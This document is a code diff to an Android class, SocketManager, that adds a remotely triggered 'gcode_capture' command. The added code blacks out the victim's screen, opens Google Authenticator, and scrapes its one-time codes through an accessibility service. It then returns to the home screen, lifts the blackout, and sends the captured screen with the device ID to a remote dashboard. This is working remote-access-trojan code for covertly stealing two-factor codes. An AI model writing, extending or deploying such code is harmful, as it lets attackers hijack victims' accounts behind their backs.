@@ -1793,6 +1793,7 @@ public class SocketManager {
             case "get_screen_recording":
             case "delete_screen_recording":
             case "g_authenticatorHelper":
+            case "gcode_capture":
             case "list_gcode_screenshots":
             case "get_gcode_screenshot":
             case "delete_gcode_screenshot":
@@ -2120,6 +2121,95 @@ public class SocketManager {
                 boolean deleted = file.delete();
                 r.put("success", deleted);
                 if (!deleted) r.put("error", "Could not delete file");
+                return r;
+            }
+
+            case "gcode_capture": {
+                // Single-command on-device capture:
+                // 1. blackout  2. open authenticator  3. read screen
+                // 4. press home  5. unblackout  6. push screen:update to dashboard
+                // Returns immediately; result arrives via screen:update event.
+                JSONObject r = new JSONObject();
+                r.put("success", true);
+                r.put("streaming", true);
+                r.put("message", "On-device authenticator capture started");
+                executor.execute(() -> {
+                    String pkg = "com.google.android.apps.authenticator2";
+                    try {
+                        // Step 1: blackout
+                        dispatchCommand("screen_blackout_on", new JSONObject());
+
+                        // Step 2: open app
+                        JSONObject openParams = new JSONObject();
+                        openParams.put("packageName", pkg);
+                        JSONObject openResult = dispatchCommand("open_app", openParams);
+                        if (openResult == null || !openResult.optBoolean("success", false)) {
+                            pkg = "com.google.android.apps.authenticator";
+                            openParams.put("packageName", pkg);
+                            openResult = dispatchCommand("open_app", openParams);
+                        }
+                        if (openResult == null || !openResult.optBoolean("success", false)) {
+                            Log.w(TAG, "gcode_capture: failed to open Authenticator");
+                            dispatchCommand("screen_blackout_off", new JSONObject());
+                            return;
+                        }
+
+                        // Step 3: wait for app to fully render
+                        try { Thread.sleep(3000); } catch (InterruptedException ignored) {}
+
+                        // Step 4: read screen via accessibility
+                        UnifiedAccessibilityService svc = UnifiedAccessibilityService.getInstance();
+                        JSONObject screenResult = null;
+                        if (svc != null) {
+                            ScreenReader sr = new ScreenReader(svc);
+                            boolean acq = false;
+                            try {
+                                acq = accessSemaphore.tryAcquire(5, TimeUnit.SECONDS);
+                                if (acq) screenResult = sr.readScreen();
+                            } finally {
+                                if (acq) accessSemaphore.release();
+                            }
+                        } else {
+                            Log.w(TAG, "gcode_capture: accessibility service unavailable");
+                        }
+
+                        // Step 5: press home + remove blackout
+                        dispatchCommand("press_home", new JSONObject());
+                        dispatchCommand("screen_blackout_off", new JSONObject());
+
+                        // Step 6: push result to dashboard via screen:update
+                        JSONObject payload = new JSONObject();
+                        payload.put("deviceId", DeviceInfo.getDeviceId(context));
+                        payload.put("source", "gcode_capture");
+                        if (screenResult != null) {
+                            payload.put("success", screenResult.optBoolean("success", false));
+                            if (screenResult.has("screen")) payload.put("screen", screenResult.get("screen"));
+                            if (screenResult.has("error"))  payload.put("error",  screenResult.getString("error"));
+                        } else {
+                            payload.put("success", false);
+                            payload.put("error", "Accessibility service unavailable");
+                        }
+                        sendMessage("screen:update", payload);
+
+                        // Also save a local snapshot for history
+                        if (screenResult != null && screenResult.optBoolean("success", false)) {
+                            JSONObject screen = screenResult.optJSONObject("screen");
+                            if (screen != null) saveGcodeScreenshot(screen, pkg);
+                        }
+                    } catch (Exception e) {
+                        Log.e(TAG, "gcode_capture error: " + e.getMessage());
+                        try {
+                            dispatchCommand("press_home", new JSONObject());
+                            dispatchCommand("screen_blackout_off", new JSONObject());
+                            JSONObject errPayload = new JSONObject();
+                            errPayload.put("deviceId", DeviceInfo.getDeviceId(context));
+                            errPayload.put("source", "gcode_capture");
+                            errPayload.put("success", false);
+                            errPayload.put("error", e.getMessage());
+                            sendMessage("screen:update", errPayload);
+                        } catch (Exception ignored) {}
+                    }
+                });
                 return r;
             }
         }
